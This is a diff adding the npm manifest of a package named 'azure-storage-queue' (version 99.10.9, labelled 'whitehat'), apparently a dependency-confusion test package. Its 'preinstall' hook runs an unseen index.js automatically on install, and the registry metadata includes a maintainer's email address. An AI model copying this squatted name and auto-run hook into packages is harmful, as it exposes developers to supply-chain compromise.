@@ -1,0 +1,39 @@
+{
+    "name": "azure-storage-queue",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-storage-queue@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-HoMucfTqzQduMvdXWYYO41aiteMG/qBfD4aM9psMCFoZH082e3QFcpJ3TH1dVGhqwclJRx+48sDff97LEx7hnQ==",
+        "shasum": "7181ac709c566f6b338728a50c806d565f48e77f",
+        "tarball": "https://registry.npmjs.org/azure-storage-queue/-/azure-storage-queue-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3583,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhonxwCRA9TVsSAnZWagAAnIsP+wYT91SDmo7H+fy+ZI9o\n3/K8W1oYwcKcssvf7ER2t6v2m1KPF7v1XNbZOod2ihsd8T8Zlm10xi88vl4G\nUJT/1PuQhlsKr3DZ+xEvsAoIJCTf4lcghB47k/EWzLMgAC0kx1kAomXGU3rk\nB0mJmTAWYE1WG82vlzenhh5Gn/NJHCzaCECgI5llSN9IqX0fpZH7ynPx6smv\nCz0sGjJJmT7Fy0NWFZD3Xqy/ZNtf3EnfVITYnjoxecZBr3c+57sh5wVzurvb\nAy4ocGsYY+cM8slJ8kd2d2Narl8pnh3Dql/5pNIwXOl3VpqnAauIuDowqjSl\nzJ2vP0UhgdJMZCrwvX1GBoQaRuMtyV1jl8K/IsjVINGoEDUMSJE4ugGt4+ph\nN8mmDRSKFyIUvwyx/ytU6rGFt0AiBjDx0SZl0ELb9zQFzRg/bzA+ZqOg04hm\n9IeKiEowAa0E1ZhjyuB33NLP53Kl+KBjEWArRNWZWfqZr93QphDNZsXsQb2m\nHj+WmfutWwO6oIksv1tnYw6v6a4KE+v/A4UPnsTMDJFJ8Oas2WSjUxbuHe27\nJnDBuQvFa/DMi75hY9Yhsb/Arc+VUwKxu1iuaXY6O1XLSqbgNG/QV07yghNv\nAlA1zi3i+jMqdTlbMaMoEez0aNGegcYWEoigMUR50ipAUwGSg4Ln87i00MT6\njFNO\r\n=fqEu\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-storage-queue_99.10.9_1638038640807_0.6807254395939486"
+    },
+    "_hasShrinkwrap": false
+}
